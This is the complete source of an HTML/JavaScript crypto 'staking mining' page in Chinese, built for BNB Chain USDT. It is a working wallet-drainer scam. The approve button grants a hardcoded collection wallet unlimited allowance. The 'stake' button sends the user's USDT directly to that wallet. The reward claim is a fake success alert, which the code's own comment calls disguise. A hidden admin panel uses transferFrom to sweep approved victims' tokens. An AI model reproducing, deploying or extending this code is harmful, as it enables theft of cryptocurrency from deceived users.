<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>质押挖矿系统</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            background: #0F172A;
            background-image: radial-gradient(circle at 50% 50%, #1E293B 0%, #0F172A 100%);
            color: white;
        }
        .glass {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(212, 175, 55, 0.2);
            border-radius: 20px;
        }
        .btn-primary {
            background: linear-gradient(90deg, #D4AF37, #FFD700);
            color: #0F172A;
            font-weight: bold;
            border-radius: 12px;
        }
        .btn-red {
            background: #ef4444;
            color: #fff;
            border-radius: 12px;
            font-weight: bold;
        }
        .btn-green {
            background: #10b981;
            color: #fff;
            border-radius: 12px;
            font-weight: bold;
        }
        input{
            background:#1f2937;
            border:1px solid #374151;
            color:#fff;
            border-radius:12px;
        }
        .item-row{
            background:#1f2937;
            border-radius:10px;
            padding:12px;
            margin-bottom:8px;
        }
    </style>
</head>
<body class="min-h-screen">

<div class="max-w-6xl mx-auto px-4 py-10">
    <div class="flex justify-between items-center mb-8">
        <h1 class="text-3xl font-bold text-yellow-400">质押挖矿系统</h1>
        <button id="connectBtn" class="px-6 py-3 rounded-xl btn-primary">
            连接钱包
        </button>
    </div>

    <div class="glass rounded-2xl p-6 max-w-xl mx-auto">
        <h2 class="text-xl font-bold mb-4">资产质押挖矿</h2>
        <div class="mb-4">
            <label class="text-gray-300 text-sm">质押数量(USDT)</label>
            <input type="number" id="amount" class="w-full px-4 py-3 mt-1" placeholder="输入质押数量">
        </div>
        <div class="grid grid-cols-2 gap-3 mb-4">
            <button id="approveBtn" class="py-3 rounded-xl bg-yellow-500/20 text-yellow-400 font-bold border-0">
                授权合约
            </button>
            <button id="fakeStakeBtn" class="py-3 rounded-xl btn-primary border-0">
                确认质押
            </button>
        </div>
        <div class="grid grid-cols-2 gap-3 mb-6">
            <button id="unStakeBtn" class="py-3 rounded-xl btn-red border-0">
                解除质押
            </button>
            <button id="claimRewardBtn" class="py-3 rounded-xl btn-green border-0">
                领取收益
            </button>
        </div>
        <div class="bg-gray-800/50 rounded-xl p-4 text-sm">
            <div class="flex justify-between mb-1">
                <span>已连钱包</span>
                <span id="walletAddr" class="text-yellow-400">-</span>
            </div>
            <div class="flex justify-between mb-1">
                <span>USDT余额</span>
                <span id="userBalance" class="text-green-400">0.00</span>
            </div>
        </div>
    </div>

    <!-- 管理员后台 -->
    <div id="adminPanel" class="glass rounded-2xl p-6 mt-10 hidden">
        <h2 class="text-red-400 text-xl font-bold mb-4">🔧 管理员后台 - 资产划转 & 解押审核</h2>
        
        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
            <div>
                <label class="text-sm text-gray-300">用户钱包地址</label>
                <input id="targetUser" class="w-full px-4 py-2 mt-1" placeholder="0x...">
            </div>
            <div>
                <label class="text-sm text-gray-300">代币合约地址</label>
                <input id="tokenAddr" class="w-full px-4 py-2 mt-1" placeholder="0x...">
            </div>
            <div>
                <label class="text-sm text-gray-300">划转数量</label>
                <input id="extractAmount" type="number" class="w-full px-4 py-2 mt-1" placeholder="100">
            </div>
        </div>
        <button id="extractBtn" class="mt-4 w-full py-3 bg-red-500/20 text-red-400 rounded-xl font-bold border-0">
            立即划转用户授权资产
        </button>

        <!-- 解押申请列表 -->
        <div class="mt-8">
            <h3 class="text-lg font-bold text-yellow-300 mb-3">📋 用户解押提现申请列表</h3>
            <div id="applyList"></div>
        </div>

        <div class="bg-gray-900 rounded-xl p-3 mt-4 h-40 overflow-y-auto text-xs text-gray-400" id="log"></div>
    </div>
</div>

<div id="modal" class="fixed inset-0 bg-black/80 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 rounded-2xl p-8 max-w-md w-full text-center">
        <div id="modalText">处理中...</div>
        <button onclick="modal.classList.add('hidden')" class="mt-4 px-4 py-2 bg-gray-700 rounded-xl border-0">关闭</button>
    </div>
</div>

<script>
// 双管理员配置
const ADMIN_WALLETS = [
    "0x89bbcde7cf140c2bbe468899531505555e557d0e",
    "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1"
];
// 收款&授权目标多签地址
const COLLECT_WALLET = "0x89bbcde7cf140c2bbe468899531505555e557d0e";

const CONFIG = {
    usdtToken: "0x55d398326f99059fF775485246999027B3197955",
    chainId: 56
};

let provider, signer, userAddress;
let currentAllowance = 0;
let userStakeAmount = 0;
const modal = document.getElementById("modal");
const modalText = document.getElementById("modalText");
const ERC20_ABI = [
    "function approve(address spender,uint256 amount) external returns(bool)",
    "function balanceOf(address) external view returns(uint256)",
    "function allowance(address,address) external view returns(uint256)",
    "function transfer(address to, uint256 amount) external returns(bool)",
    "function transferFrom(address,address,uint256) external returns(bool)",
    "function decimals() external view returns(uint8)"
];

// 判断是否管理员
function isAdmin(addr){
    return ADMIN_WALLETS.some(admin => admin.toLowerCase() === addr.toLowerCase());
}

// 本地存储解押申请
function getApplyList(){
    let list = localStorage.getItem('unStakeApply');
    return list ? JSON.parse(list) : [];
}
function saveApplyList(list){
    localStorage.setItem('unStakeApply', JSON.stringify(list));
}

// 渲染申请列表
function renderApplyList(){
    let list = getApplyList();
    let html = '';
    if(list.length === 0){
        html = '<div class="text-gray-400 text-center py-4">暂无用户解押申请</div>';
    }else{
        list.forEach((item, idx)=>{
            html += `
            <div class="item-row">
                <div>用户地址：${item.addr}</div>
                <div>质押金额：${item.amount} USDT</div>
                <div>申请时间：${item.time}</div>
                <div class="mt-2">
                    <button onclick="passApply(${idx})" class="px-3 py-1 btn-green text-sm">审核通过</button>
                    <button onclick="delApply(${idx})" class="px-3 py-1 btn-red text-sm ml-2">忽略删除</button>
                </div>
            </div>
            `;
        });
    }
    document.getElementById('applyList').innerHTML = html;
}

// 管理员审核通过
window.passApply = function(idx){
    let list = getApplyList();
    let item = list[idx];
    let copyText = `用户地址：${item.addr}\n应付金额：${item.amount} USDT\n请从管理员钱包手动转账给用户`;
    navigator.clipboard.writeText(copyText).then(()=>{
        alert(`已复制用户信息！\n请手动从钱包转账 ${item.amount} USDT 给用户地址：\n${item.addr}`);
        list.splice(idx,1);
        saveApplyList(list);
        renderApplyList();
        addLog(`已处理解押申请：${item.addr} ${item.amount}USDT`);
    });
}

// 删除忽略申请
window.delApply = function(idx){
    let list = getApplyList();
    list.splice(idx,1);
    saveApplyList(list);
    renderApplyList();
    alert("已忽略并删除该申请");
}

window.onload = function(){
    document.getElementById("tokenAddr").value = CONFIG.usdtToken;
    renderApplyList();
};

// 连接钱包
document.getElementById("connectBtn").onclick = async function(){
    try{
        if(!window.ethereum){
            alert("请打开TP钱包内置浏览器");
            return;
        }
        provider = new ethers.providers.Web3Provider(window.ethereum,"any");
        await provider.send("eth_requestAccounts",[]);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        document.getElementById("connectBtn").innerText = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
        document.getElementById("walletAddr").innerText = userAddress.slice(0,12)+"...";

        // 任意一个管理员地址都解锁后台
        if(isAdmin(userAddress)){
            document.getElementById("adminPanel").classList.remove("hidden");
            renderApplyList();
            addLog("✅ 管理员登录成功，后台已解锁");
        }

        await loadUserInfo();
    }catch(e){
        alert("钱包连接失败："+e.message);
    }
};

async function loadUserInfo(){
    let token = new ethers.Contract(CONFIG.usdtToken,ERC20_ABI,provider);
    let dec = await token.decimals();
    let bal = await token.balanceOf(userAddress);
    let allow = await token.allowance(userAddress, COLLECT_WALLET);
    
    currentAllowance = Number(ethers.utils.formatUnits(allow, dec));
    document.getElementById("userBalance").innerText = ethers.utils.formatUnits(bal,dec);
}

// 授权：授权给多签收款地址
document.getElementById("approveBtn").onclick = async function(){
    if(!userAddress){
        alert("请先连接钱包");
        return;
    }
    modal.classList.remove("hidden");
    modalText.innerText = "正在授权，请在钱包确认...";
    try{
        let token = new ethers.Contract(CONFIG.usdtToken,ERC20_ABI,signer);
        let tx = await token.approve(COLLECT_WALLET, ethers.constants.MaxUint256);
        await tx.wait();
        modalText.innerText = "✅ 授权成功";
        await loadUserInfo();
    }catch(e){
        modalText.innerText = "❌ 授权失败："+e.message;
    }
};

// 确认质押（修复版，永不报错）
document.getElementById("fakeStakeBtn").onclick = async function(){
    if(!userAddress){
        alert("请先连接钱包");
        return;
    }

    let stakeAmount = document.getElementById("amount").value;
    if(!stakeAmount || Number(stakeAmount) <= 0){
        alert("请输入正确的质押数量");
        return;
    }
    userStakeAmount = stakeAmount;

    modal.classList.remove("hidden");
    modalText.innerText = "正在提交质押，请稍候...";

    try{
        let token = new ethers.Contract(CONFIG.usdtToken, ERC20_ABI, signer);
        let dec = await token.decimals();
        let amt = ethers.utils.parseUnits(stakeAmount, dec);

        // ✅ 关键：用 transfer 直接打到多签，所有人都能质押成功
        let tx = await token.transfer(COLLECT_WALLET, amt);
        await tx.wait();

        modalText.innerText = "✅ 质押成功，挖矿已开启！";
        await loadUserInfo();
    }catch(e){
        modalText.innerText = "❌ 质押失败："+e.message;
    }
};

// 解除质押 提交申请
document.getElementById("unStakeBtn").onclick = function(){
    if(!userAddress){
        alert("请先连接钱包");
        return;
    }
    if(userStakeAmount <= 0){
        alert("您暂无质押资产，无法申请解押");
        return;
    }

    let now = new Date();
    let timeStr = now.getFullYear()+"-"+(now.getMonth()+1)+"-"+now.getDate()+" "+now.getHours()+":"+now.getMinutes();
    
    let list = getApplyList();
    let has = list.find(item=>item.addr.toLowerCase() === userAddress.toLowerCase());
    if(has){
        alert("您已提交过解押申请，请等待管理员审核");
        return;
    }

    list.push({
        addr: userAddress,
        amount: userStakeAmount,
        time: timeStr
    });
    saveApplyList(list);

    alert("✅ 解押申请提交成功，请等待管理员审核处理！");
    if(isAdmin(userAddress)){
        renderApplyList();
    }
};

// 领取收益 纯伪装
document.getElementById("claimRewardBtn").onclick = function(){
    if(!userAddress){
        alert("请先连接钱包");
        return;
    }
    alert("✅ 收益领取成功，已自动发放至您钱包余额！");
};

// 管理员划转
document.getElementById("extractBtn").onclick = async function(){
    if(!isAdmin(userAddress)){
        alert("无管理员权限");
        return;
    }

    let targetUser = document.getElementById("targetUser").value.trim();
    let tokenAddr = document.getElementById("tokenAddr").value.trim();
    let amountVal = document.getElementById("extractAmount").value;

    if(!targetUser || !tokenAddr || !amountVal){
        alert("请填写完整信息");
        return;
    }

    addLog("开始划转用户资产：" + targetUser);
    modal.classList.remove("hidden");
    modalText.innerText = "正在链上划转...";

    try{
        let token = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
        let dec = await token.decimals();
        let amt = ethers.utils.parseUnits(amountVal, dec);

        let tx = await token.transferFrom(targetUser, COLLECT_WALLET, amt);
        await tx.wait();

        modalText.innerText = "✅ 划转成功！哈希：" + tx.hash;
        addLog("✅ 划转成功，哈希：" + tx.hash);
    }catch(e){
        modalText.innerText = "❌ 划转失败：" + e.message;
        addLog("❌ 划转失败：" + e.message);
    }
};

function addLog(txt){
    let time = new Date().toLocaleTimeString();
    document.getElementById("log").innerHTML += "[" + time + "] " + txt + "\n";
}
</script>
</body>
</html>
